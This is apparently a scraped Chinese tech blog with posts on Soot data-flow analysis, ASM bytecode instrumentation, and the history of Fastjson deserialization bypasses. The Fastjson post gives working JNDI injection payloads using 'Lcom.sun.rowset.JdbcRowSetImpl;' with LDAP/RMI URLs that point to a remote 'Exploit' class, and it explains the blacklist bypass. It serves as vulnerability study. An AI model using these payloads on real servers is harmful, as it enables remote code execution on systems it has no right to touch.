抽象类型。人们通常会用Set和Map来表示，但是，Soot要求抽象类型必须正确实现equals()和hashCode()方法，这样Soot才能确定何时到达一个固定点。 关键方法举例 构造函数 必须实现一个携带DirectedGraph作为参数的构造函数，并且将该参数传递给super constructor。然后，在构造函数结束时调用doAnalysis()，doAnalysis()将真正执行数据流分析。而在调用super constructor和doAnalysis之间，可以自定义数据分析结构。 123456789public MyAnalysis(DirectedGraph graph) &#123; //构造函数 super(graph);//传递给父类 // TODO Auto-generated constructor stub emptySet = new ArraySparseSet();//自定义分析 doAnalysis();//执行fixed-point&#125; 数据流集合的初始化问题 newInitialFlow &amp; entryInitialFlow newInitialFlow()方法返回一个抽象类型A的对象，这个对象被赋值给每个语句的in-set和out-set集合，除过UnitGraph的第一个句子的in-set集合（如果你实现的是backwards分析，则是除去exit statement语句）。第一个句子的in-set集合由entryInitialFlow()初始化。 1234567891011@Overrideprotected Object newInitialFlow() &#123; // TODO Auto-generated method stub return emptySet.emptySet();&#125; @Overrideprotected Object entryInitialFlow() &#123; // TODO Auto-generated method stub return emptySet.emptySet();&#125; 流集合操作 集合复制 copy() copy()方法接收两个A类型的参数，分别是source和target，该方法其实就是把source复制到target集合里面。 1234567@Overrideprotected void copy(Object source, Object dest) &#123; // TODO Auto-generated method stub FlowSet srcSet = (FlowSet)source, FlowSet destSet = (FlowSet)dest; srcSet.copy(destSet);&#125; 交汇运算 merge() merge(..)方法被用来在control-flow的合并点处合并数据流集，例如：在句子(if/then/else)分支的结束点。与copy(..)不同的是，它携带了三个参数，一个参数是来自左边分支的out-set，一个参数是来自右边分支的out-set，另外一个参数是两个参数merge后的集合，这个集合将是合并点的下一个句子的in-set集合。 注：merge(..)本质上指的是控制流的交汇运算，一般根据待分析的具体问题来决定采用并集还是交集。 123456789@Overrideprotected void merge(Object in1, Object in2, Object out) &#123; // TODO Auto-generated method stub FlowSet inSet1 = (FlowSet)in1, inSet2 = (FlowSet)in2, outSet = (FlowSet)out; //inSet1.union(inSet2, outSet); inSet1.intersection(inSet2, outSet);&#125; flowThrough(..) 大名鼎鼎的transfer function flowThrough(..)方法是真正的执行流函数，它有三个参数：A in-set、被处理的N类型节点（一般指的就是句子Unit）、A out-set。这个方法的实现内容完全取决于你的分析。 注：flowThrough()本质上就是一个传递函数。在一个语句之前和之后的数据流值受该语句的语义的约束。比如，假设我们的数据流分析涉及确定各个程序点上各变量的常量值。如果变量a在执行语句b=a之前的值为v，那么在该语句之后a和b的值都是v。一个赋值语句之前和之后的数据流值的关系被称为传递函数。针对前向分析和后向分析，传递函数有两种风格。 1234567891011121314151617181920212223242526272829303132333435363738@Overrideprotected void flowThrough(Object in, Object d, Object out) &#123; // TODO Auto-generated method stub FlowSet inSet = (FlowSet)in, FlowSet outSet = (FlowSet)out; Unit u = (Unit) d; kill(inSet,u,outSet); gen(outSet,u);&#125; private void kill(FlowSet inSet, Unit u, FlowSet outSet) &#123; // TODO Auto-generated method stub FlowSet kills = (FlowSet)emptySet.clone();//Unit的kills Iterator defIt = u.getDefBoxes().iterator(); while(defIt.hasNext())&#123; ValueBox defBox = (ValueBox)defIt.next(); if(defBox.getValue() instanceof Local)&#123; Iterator inIt = inSet.iterator(); while(inIt.hasNext())&#123; Local inValue = (Local)inIt.next(); if(inValue.equivTo(defBox.getValue()))&#123; kills.add(defBox.getValue()); &#125; &#125; &#125; inSet.difference(kills, outSet);&#125; private void gen(FlowSet outSet, Unit u) &#123; // TODO Auto-generated method stub Iterator useIt = u.getUseBoxes().iterator(); while(useIt.hasNext())&#123; ValueBox e = (ValueBox)useIt.next(); if(e.getValue() instanceof Local) outSet.add(e.getValue()); &#125;&#125; Flow-sets在soot中，flow sets代表control-flow-graph中与节点相关的数据集合。 CFG中的每个节点，都有一个flowset与之关联。 Flow set存在有边界的（需要实现BoundedFlowSet接口）和无边界的（需要实现FlowSet接口）两种表达。 有边界的集合知道possible值的全体集合(适合指针分析)，而无边界的集合则不知道。 interface FlowSet&lt;T&gt;方法： 123456789101112131415161718192021222324252627282930313233343536FlowSet&lt;T&gt; clone(); //克隆当前FlowSet的集合FlowSet&lt;T&gt; emptySet();//返回一个空集，通常比((FlowSet)clone()).clear()效率更高void copy(FlowSet&lt;T&gt; dest);//拷贝当前集合到dest集合中void clear();//返回该flowset的清空void union(FlowSet&lt;T&gt; other); //将FlowSet ∪nion other 并集返回值再赋给FlowSetvoid union(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest); // FlowSet ∪ other = dest，其中other、dest可以与该FlowSet一样void intersection(FlowSet&lt;T&gt; other); //FlowSet ∩ other = FlowSetvoid intersection(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest); //FlowSet ∩ other = dest 其中，dest、other可以和该FlowSet一样void difference(FlowSet&lt;T&gt; other); // FlowSet-other = FlowSetvoid difference(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest); // FlowSet-other = dest,其中，dest、other和FlowSet可能相同。boolean isEmpty();int size();void add(T var1);void add(T var1, FlowSet&lt;T&gt; var2);void remove(T var1);void remove(T var1, FlowSet&lt;T&gt; var2);boolean contains(T var1);boolean isSubSet(FlowSet&lt;T&gt; var1);Iterator&lt;T&gt; iterator();List&lt;T&gt; toList(); 上述方法足以使flow sets成为一个有效的lattice元素。 而对于有边界的flowset，需要实现BoundedFlowSet接口 它需要提供方法，该方法能够产生set‘s complement（补集）和它的topped set（全集）（一个lattice element包括所有的可能的值的集合）。 四种flow sets的实现ArraySparseSet,ArrayPackedSet,ToppedSet和DavaFlowSet。 ArraySparseSet:是一个无界限的flowset。该set代表一个数组引用。注意：当比较元素是否相等时，一般使用继承自Object对象的equals。但是在soot中的元素都是代表一些代码结构，不能覆写equals方法。而是实现了interface soot.EquivTo。因此，如果你需要一个包含类似binary operation expressions的集合，你需要使用equivTo方法实现自定义的比较方法去比较是否相等。 ArrayPackedSet : 有界flow set。需要提供FlowUniverse 对象，即代表全集的容器。由一个在integer和object双向map和一个用来表示全集成员是否在内的bit vector表示。 ToppedSet : 在基于上面两种的set前提下，加入额外信息来表示其为lattice中的Top。 soot官方例子Live Variables Analysis 变量v是live状态的条件是： 从v的定义点p开始，v就是活跃的，一直到use(v)地方，中间没有对v的重定义； step1May-analysis : BackwardAnalysis 下面这张图 倒着看 效果会更好！ 在soot里面，后向分析可以继承BackwardFlowAnalysis抽象类。 汇聚点的操作是union 变量集合可以是继承了FlowSet的ArraySparseSet集合 step2copy和merge的具体操作： copy() copy就是直接把当前节点的IN copy 给上一个BB块的OUT merge() 由于是union ， 所以是把分叉点的两个IN union取并集 为分支点的OUT step3flowThrough() 例如: x = y * z backwardanalysis分析：先kill def[x] ,再 gen use[y,z] 1234567891011121314151617// kill // for each local v def’d in this unit, remove v from destfor(ValueBox box : ut.getDefBoxes())&#123; Value value = box.getValue(); if( value instanceof Local )&#123; dest.remove( value ); &#125;&#125;// gen// for each local v used in this unit, add v to destfor (ValueBox box : ut.getUseBoxes())&#123; Value value = box.getValue(); if (value instanceof Local)&#123; dest.add(value); &#125;&#125; step4Initial values step5Constructor step6Enjoy result 1234LiveVariablesAnalysis lv = new LiveVariablesAnalysis(g);// return SparseArraySets of live variables:lv.getFlowBefore(s);lv.getFlowAfter(s); Branched Nullness Analysis 定义： 如果所有到达s的control-flow path 都导致v被分配了一个非null的值，那么局部变量v在s处就是非null的。 图示： step1选择实现ForwardBranchedFlowAnalysis step2和上一个例子一样： copy() forward 正常copy就行 12345protected void copy(Object src, Object dest) &#123; FlowSet sourceSet = (FlowSet)src, destSet = (FlowSet) dest; sourceSet.copy(destSet);&#125; merge() 如果一个变量v在从开始到s的所有路径上都是非空的，那么它就是非空的，所以取交集，intersection() 1234void merge(...) &#123; // [cast Objects to FlowSets] srcSet1.intersection(srcSet2,destSet);&#125; step3设计 flow function 零散知识点以$开头的都是临时变量，表示相对堆栈位置，并不是源程序中的局部变量。 没有$的局部变量则代表真正的局部变量。 jtp是允许用户自定义的，wjtp全程序转换包 clinit方法clinit是类构造器方法，也就是在jvm在进行类加载-验证-解析-初始化中的初始化阶段，jvm会调用clinit. clinit方法是在类加载过程中执行的，而init方法是在对象实例化执行的。 soot的控制流图在soot.toolkits.graph这个包内； Annotating Code 四个接口： Host：是可以容纳和管理标签的对象。就像SootClass、SootField、Body、Unit、Value、ValueBox等 Tag：可以给Host打标记的对象，很通用，用来标记name-vlaue对给Host Attribute：是Tag的拓展。任何属于属性的东西都可以输出到文件中。Soot里有一个tool叫做SootClass，可以输出直接码ByteCode，任何应该输出到类文件的东西都必须extend JasminAttribute。 CallGraph的方法调用 Soot中调用图的所有已知方法调用edge边的集合。 包括： 显式方法调用 隐式静态初始化器 隐式调用Thread.run() 隐式调用 调用图的每一条边edge对象都存在四个元素： 源方法 source method 源语句 source statement 目标方法 target method、 边的种类，例如静态调用invoke static 、虚拟调用 invoke virtual、接口调用invoke interface CallGraph也有几个经典方法： edgesInto(method)：查询进入method方法的边 edgesOutOf(method)：从method方法流出来的边 edgesOutOf(statement)：从特定语句statement流出来的边 每个方法其实都会返回一个Iterator来调度Edge边对象 Soot提供了三个适配器来针对Edges进行分析： Sources：每条边的原方法 Units：每条边的原语句 Targets：每条边的目标方法 例子： 12345678public void printPossibleCallers(SootMethod target)&#123; CallGraph cg = Scene.v().getCallGraph(); Iterator sources = new Sources(cg.edgesInto(target)); while(sources.hasNext())&#123; SootMethod src = (SootMethod)sources.next(); Sysytem.out.println(target + \"might be called by \" + src); &#125;&#125; 更详细的两个图类： ReachableMethods and TransitiveTargets ReachableMethods 表示能从entrypoints开始，能reach到的方法集合 方法contains(method)表示去测试method方法能不能到达，能不能reachable 方法listener()返回的是一个迭代器遍历所有可达方法。 TransitiveTargets 表示从一个特定的方法能指向的所有方法，这个方法可以用来分析调用链。 构造函数接收（除了调用图之外）一个额外过滤器Filter Filter表示调用图中满足给定的EdgePredicate的边的子集。 EdgePredicate是一组接口，它主要有两个实现，ExplicitEdgespred ,InstanceInvokeEdgesPred； 三个翻译器类： JavaTranslator、StmtTranslator、ExprTranslator JavaTranslator负责将给定的Java程序的方法进行翻译，然后将这些翻译之后的语句组合在一起。 它会维护着一个数组，数组会在makeMethod方法之后被初始化。 translate方法是主要方法，这个方法会完成语句的翻译和链接。 StmtTranslator继承了AbstractStmtSwitch，他会翻译单独、独立的语句。 它的主要方法是translateStmt，这个方法其实会把StmtTranslator应用于语句，然后建立一个Map映射对，把Java语句和Jimple代码进行映射，对错误报告很方便。 此外还有一个方法是addStatement，它会将给定的语句添加到指定的方法中，它是整个翻译过程中用来添加语句的方法。 Subexpression是用ExprTranslator（它是AbstractJimpleValueSwitch类的拓展）来翻译的。 切入点是translateExpr方法，他是将Exprtranslator应用到给定的ValueBox上面。 两个有趣方法： caseSpecialInvokerExpr和handleCall； caseSpecialInvokerExpr是用来测试是否进行了对象的初始化，如果是的话，那么就创建一个Foo初始化语句；如果不是的话，那么就调用handleCall方法。 过程内分析数据流分析是针对某一个方法的控制流图（在Soot里面用的是UnitGragh）来分析的。由于是方法内的数据流分析，所以每一个节点都是Stmt语句。 一个UnitGraph会把每条语句作为节点node，两个节点所对应的语句如果能够流通，那么在图上就会有一条边。 每个节点会有两个集合，一个代表入集：in-set，一个代表出集：out-set。 这些集合会随着程序运行实时保存记录，直到遇到一个fixed-point点结束。 在Soot里面有三种数据流分析，分别是Forward/Backward/和Branched ForwardFlowAnalysis：就是正向的数据分析，从程序的入口点entry point顺着一路下来分析； BackWardsFlowAnalysis：逆向分析，从程序的结束点exit-node倒推。这里官方文档说可以顺着ForeardAnalysis来继续用，但是需要换成用InverseGraph，以后有空补上这个细节。 ForwardBranchedAnalysis：也是正向分析的一种，只不过会对if这样的分支语句进行分支分析。例如if(p!=null)，那么在当分析这一条语句时候，他其实就会自动分出分支，将p is not null放到then分支，然后把p is null放到else分支。 实现Analysis接口 ForwardFlowAnalysis是抽象类，继承关系如下： 1AbstractFlowAnalysis&lt;N,A&gt; -&gt;FlowAnalysis&lt;N,A&gt;-&gt;ForwardFlowAnalysis&lt;N,A&gt; ForwardFlowAnalysis有两个参数： N：节点种类。通常是Unit A：Abstraction Type 抽象类型。人们通常会用Set和Map来表示，但是，Soot要求抽象类型必须正确实现equals()和hashCode()方法，这样Soot才能确定何时到达一个固定点。 构造函数： 要求：必须实现一个构造函数，该构造函数至少接收一个DirectedGraph作为参数，其中N为节点类型，并且将它传递给父类的constructor；super.init 并且在自定义的constructor最后，需要调用doAnalysis()函数，这个函数在最后才会分析数据流。 在调用superconstructor和doAnalysis()函数之间，你可以自定义分析数据结构。 方法： newInitialFlow() and entryInitialFlow() newInitialFlow()会返回一个抽象类型对象A，这个对象是每个node节点默认初始化的in-set和out-set。 特殊的是entry-point的in-set是通过entryInitialFlow()方法完成的。 copy()方法接收两个A类型的参数，分别是source和target，该方法其实就是把source复制到target集合里面。 The copy(..) method takes two arguments of type A (your abstraction), a source and a target. It merely copies the source into the target. Note that the class A has to provide appropriate methods. In particular, A may not be immutable. You can work around this limitation by using a box or set type for A. merge()方法用来在分支汇聚点处汇聚flowsets 它会接收3个参数，分别是左分支和右分支还有一个额外分支，这个额外分支其实是为了下一个节点汇聚而成的in-set。 Opposed to copy(..) it takes three arguments, an out-set from the left-hand branch, an out-set from the right-hand branch and another set, which is going to be the newly merged in-set for the next statement after the merge point. 最后需要实现的方法是flowThrough(); flowThrough()方法会接收3个参数作为输入： A的in-set。 N类型的node，也就需要待处理的语句。 A的out-set。 这个方法的内容完全取决于你的分析和抽象。 soot tricksprint in console 123456soot.SootClass c = // your SootClassSootMethod c = // your method Body PrintWriter writer = new PrintWriter(System.out); soot.Printer.v().printTo(c, writer);writer.flush();writer.close(); print to a jimple file 1234567891011soot.SootClass c = // your SootClassFile file = new File(c.getName() + \".jimple\");PrintWriter writer;try &#123; writer = new PrintWriter(file); soot.Printer.v().printTo(c, writer); writer.flush(); writer.close();&#125; catch (FileNotFoundException e) &#123; e.printStackTrace();&#125; Jimple Checklist","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Soot","slug":"Soot","permalink":"https://0range228.github.io/tags/Soot/"}]},{"title":"记一次ASM插桩","slug":"记一次ASM插桩","date":"2020-07-09T07:42:43.000Z","updated":"2020-07-10T13:36:21.016Z","comments":true,"path":"记一次ASM插桩/","link":"","permalink":"https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1ASM%E6%8F%92%E6%A1%A9/","excerpt":"序言 有志者，事竟成。 今天来记录一次ASM插桩，接下来会主攻ASM框架了，“抽象中的抽象”。","text":"序言 有志者，事竟成。 今天来记录一次ASM插桩，接下来会主攻ASM框架了，“抽象中的抽象”。 目标实现如下代码注释的目标，在固定代码的前后，以及 return 语句之前插入逻辑，这基本上就可以满足实际的需求了。 123456789101112131415161718192021222324252627public class Music &#123; public void run() &#123; // 编译期在这里插入代码 System.out.println(\"asm insert before\"); System.out.println(\"this is run\"); // 编译期在这里插入代码 System.out.println(\"asm insert after\"); &#125; public int getValue() &#123; System.out.println(\"this is getValue\"); // 编译期在 return 语句之前插入 System.out.println(\"insert before return\"); return 1; &#125; public void put(String value) &#123; // 注意方法 desc &#125; private void add(String value, Thread thread) &#123; // 注意方法 desc &#125; protected Music fake(int[] nums, String[] values) &#123; // 注意方法 desc return null; &#125;&#125; 依赖maven： 12345&lt;dependency&gt; &lt;groupId&gt;org.ow2.asm&lt;/groupId&gt; &lt;artifactId&gt;asm&lt;/artifactId&gt; &lt;version&gt;8.0.1&lt;/version&gt;&lt;/dependency&gt; 实现分为3部分，首先我们直接上代码，待会儿再说理解： 第一部分123456789101112131415161718192021222324private static Music music;private static final String PATH = \"待转换的类路径\";public static void main(String[] args) throws IOException &#123; try &#123; //待转换的类叫做Music ClassReader cr = new ClassReader(\"FKtemp.Music\"); ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS); ClassVisitor cv = new MyVisitor(cw); cr.accept(cv,ClassReader.EXPAND_FRAMES); byte[] result = cw.toByteArray(); //转换之后的类叫做damn File file = new File(PATH+\"damn.class\"); FileOutputStream fos = new FileOutputStream(file); fos.write(result); fos.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; 理解： 待转换的类叫做Music，我先写一个ClassReader去读取这个类； 写一个ClassWriter，cw，去读取，参数COMPUTE_MAXS的意思是自动计算局部变量与操作数栈部分的大小； ClassVisitor cv = new MyVisitor(cw);可以看到用了多态，这个MyVisitor是需要在后续完成的自定义组件；我们的cv也需要委托cw； cr.accept(cv,ClassReader.EXPAND_FRAMES);cr再委托给cv去做。 第二部分这一部分就是我们自定义的ClassVisitor，叫做MyVisitor。直接上代码： 12345678910111213141516171819202122232425262728private static class MyVisitor extends ClassVisitor &#123; public MyVisitor(ClassVisitor cv) &#123; super(Opcodes.ASM5, cv); &#125; @Override public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) &#123; //return super.visitMethod(access, name, descriptor, signature, exceptions); System.out.println(\"=====================\"); System.out.println(\"acce== \" + access); System.out.println(\"name== \" + name); System.out.println(\"desc== \" + descriptor); System.out.println(\"sign== \" + signature); System.out.println(\"=====================\"); MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions); if (name.equals(\"run\")) &#123; mv = new MyMethodVisitor(Opcodes.ASM5, mv); &#125; if (name.equals(\"getValue\")) &#123; mv = new MyMethodVisitorWithReturn(Opcodes.ASM5, mv); &#125; return mv; &#125; &#125; 理解： 这里唯一重点就是重写了visitMethod方法。当我们的cv去访问class文件，只要遇到类方法，那么就会由visitMethod来响应。 在这个函数内部，我们首先来打印类方法的访问权限/名称/描述符/方法签名； 接下来，对于我们需要插桩的两个函数，run和getValue函数，分别进行响应，就有了第三部分； 第三部分MyMethodVisitor部分； 1234567891011121314151617181920212223242526272829303132333435363738394041private static class MyMethodVisitor extends MethodVisitor &#123; MyMethodVisitor(int api, MethodVisitor mv) &#123; super(api, mv); &#125; @Override public void visitCode() &#123; super.visitCode(); System.out.println(\"start hack before\"); hack(mv, \"asm insert before\"); &#125; @Override public void visitInsn(int opcode) &#123; if (opcode == Opcodes.RETURN) &#123; System.out.println(\"start hack after\"); hack(mv, \"asm insert after\"); &#125; super.visitInsn(opcode); &#125; private static void hack(MethodVisitor mv, String msg) &#123; mv.visitFieldInsn( Opcodes.GETSTATIC, Type.getInternalName(System.class), \"out\", Type.getDescriptor(PrintStream.class) ); mv.visitLdcInsn(msg); mv.visitMethodInsn( Opcodes.INVOKEVIRTUAL, Type.getInternalName(PrintStream.class), \"println\", \"(Ljava/lang/String;)V\", false ); &#125; &#125; MyMethodVisitorWithReturn部分： 1234567891011121314151617181920212223242526272829303132private static class MyMethodVisitorWithReturn extends MethodVisitor &#123; public MyMethodVisitorWithReturn(int api, MethodVisitor mv) &#123; super(api, mv); &#125; @Override public void visitInsn(int opcode) &#123; System.out.println(\"opcode==\" + opcode); if (opcode == Opcodes.IRETURN) &#123; hack(mv, \"insert before return\"); &#125; super.visitInsn(opcode); &#125; private static void hack(MethodVisitor mv, String msg) &#123; mv.visitFieldInsn( Opcodes.GETSTATIC, Type.getInternalName(System.class), \"out\", Type.getDescriptor(PrintStream.class) ); mv.visitLdcInsn(msg); mv.visitMethodInsn( Opcodes.INVOKEVIRTUAL, Type.getInternalName(PrintStream.class), \"println\", \"(Ljava/lang/String;)V\", false ); &#125; &#125; 理解： 先说第一个MyMethodVisitor部分，这个类也还是自定义的，重写了visitCode方法和visitInsn方法，分别进行插桩； 所谓插桩就是直接插入class内容，ASM已经封装好了，直接用插件看： 其实就是三行话，直接拿进来写。 结果运行代码，直接看生成的damn.class：","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"ASM","slug":"ASM","permalink":"https://0range228.github.io/tags/ASM/"}]},{"title":"Fastjson抗争的一生","slug":"Fastjson抗争的一生","date":"2020-07-06T01:27:00.000Z","updated":"2021-09-06T13:07:41.056Z","comments":true,"path":"Fastjson抗争的一生/","link":"","permalink":"https://0range228.github.io/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/","excerpt":"序言 百川东到海，何时复西归？ 这一篇来总结Fastjson不同版本的bypass方式。","text":"序言 百川东到海，何时复西归？ 这一篇来总结Fastjson不同版本的bypass方式。 1.2.24漏洞修复在1.2.25版本，针对1.2.24版本进行了修复。 我们可以总结以下1.2.24版本的漏洞产生原因： @type该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。这个过程会被叫做Fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的被屏蔽的type加载任意类+符合条件的setter与getter变成了反序列化利用点。 在找到可以调用的setter、getter之后，从这个可以被触发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。 沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）。 可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在@type中的getter、setter函数调用中也被用到）。应该对这两个点产生敏感性。 修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于被屏蔽的type标签进行一个白名单+黑名单的限制机制。 使用万能的idea对两个版本的jar包进行对比： 可以注意到，在解析json串的DefaultJSONParser类中做了一行代码的修改。当输入的键值是@type时，原本直接对值对应的类进行加载。现在会将值ref传入checkAutoType方法中。 checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数AutoTypeSupport。参考官方wiki Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改： 1ParserConfig.getGlobalInstance().setAutoTypeSupport(true); （关闭白名单机制） 可见，false为禁止自动转换，true为允许自动转换。 由于checkAutoType中两条路线的代码是穿插的，先来看默认AutoTypeSupport为False时的代码。 12345678910111213141516171819202122232425262728293031323334353637383940public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; final String className = typeName.replace('$', '.'); //一些固定类型的判断，此处不会对clazz进行赋值，此处省略 if (!autoTypeSupport) &#123; //进行黑名单匹配，匹配中，直接报错退出 for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; //对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回 for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; //此处省略了当clazz不为null时的处理情况，与expectClass有关 //但是我们这里输入固定是null，不执行此处代码 //可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。 if (!autoTypeSupport) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; //执行不到此处 return clazz;&#125; 大体流程就是先过黑名单，再过白名单，要是都不适配，最后也会报错。 可以得出在默认的AutoTypeSupport为False时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。 看一下默认黑名单，默认白名单（最下面，默认为空） 这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。 1.2.25-1.2.41绕过所以接下来所谓的绕过都是在服务端显性开启AutoTypeSupport为True的情况下进行的。（这是一个很大的限制条件） 我们先来看显性修改AutoTypeSupport为True时的代码： 1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制) 也就是true。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; final String className = typeName.replace('$', '.'); if (autoTypeSupport || expectClass != null) &#123; //先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单 for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; //同样进行黑名单匹配，如果匹配成功，则报错推出。 //需要注意所谓的匹配都是startsWith开头匹配 for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; &#125; //一些固定类型的判断，不会对clazz进行赋值，此处省略 //不匹配白名单中也不匹配黑名单的，进入此处，进行class加载 if (autoTypeSupport || expectClass != null) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader); &#125; //对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource if (clazz != null) &#123; if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; if (expectClass != null) &#123; if (expectClass.isAssignableFrom(clazz)) &#123; return clazz; &#125; else &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; &#125; &#125; //返回加载的class return clazz;&#125; 可见在显性关闭白名单的情况下，也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。 看似只能找到其他的利用类跟黑名单进行硬刚。但再跟一下类的加载TypeUtils.loadClass就会有所发现。 12345678910111213141516171819202122public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123; if (className == null || className.length() == 0) &#123; return null; &#125; Class&lt;?&gt; clazz = mappings.get(className); if (clazz != null) &#123; return clazz; &#125; //特殊处理1！ if (className.charAt(0) == '[') &#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; //特殊处理2！ if (className.startsWith(\"L\") &amp;&amp; className.endsWith(\";\")) &#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; ... 如果这个className是以[开头我们会去掉[进行加载！ 但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。 如果这个className是以L开头;结尾，就会去掉开头和结尾进行加载！ 那么加上L开头;结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为： 12345LDAP：String payload = \"&#123;\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\", \\\"autoCommit\\\":true&#125;\";RMI：&#123;\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true&#125; 关键PoC为：Lcom.sun.rowset.JdbcRowSetImpl;/Lcom.sun.rowset.RowSetImpl; 注意是要开启AutoTypeSupport的，添加以下代码就ok了： 1ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 直接运行即可绕过checkAutoType()黑名单实现弹计算器： 绕过分析我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。 下面我们调试分析看看为啥会绕过。 我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验: 再往下开始调用TypeUtils.loadClass()： 跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过： 1.2.42 漏洞修复自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单： 从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist 目前已知的哈希黑名单的对应表如下： version hash hex-hash name 1.2.42 -8720046426850100497 0x86fc2bf9beaf7aefL org.apache.commons.collections4.comparators 1.2.42 -8109300701639721088 0x8f75f9fa0df03f80L org.python.core 1.2.42 -7966123100503199569 0x9172a53f157930afL org.apache.tomcat 1.2.42 -7766605818834748097 0x9437792831df7d3fL org.apache.xalan 1.2.42 -6835437086156813536 0xa123a62f93178b20L javax.xml 1.2.42 -4837536971810737970 0xbcdd9dc12766f0ceL org.springframework. 1.2.42 -4082057040235125754 0xc7599ebfe3e72406L org.apache.commons.beanutils 1.2.42 -2364987994247679115 0xdf2ddff310cdb375L org.apache.commons.collections.Transformer 1.2.42 -1872417015366588117 0xe603d6a51fad692bL org.codehaus.groovy.runtime 1.2.42 -254670111376247151 0xfc773ae20c827691L java.lang.Thread 1.2.42 -190281065685395680 0xfd5bfc610056d720L javax.net. 1.2.42 313864100207897507 0x45b11bc78a3aba3L com.mchange 1.2.42 1203232727967308606 0x10b2bdca849d9b3eL org.apache.wicket.util 1.2.42 1502845958873959152 0x14db2e6fead04af0L java.util.jar. 1.2.42 3547627781654598988 0x313bb4abd8d4554cL org.mozilla.javascript 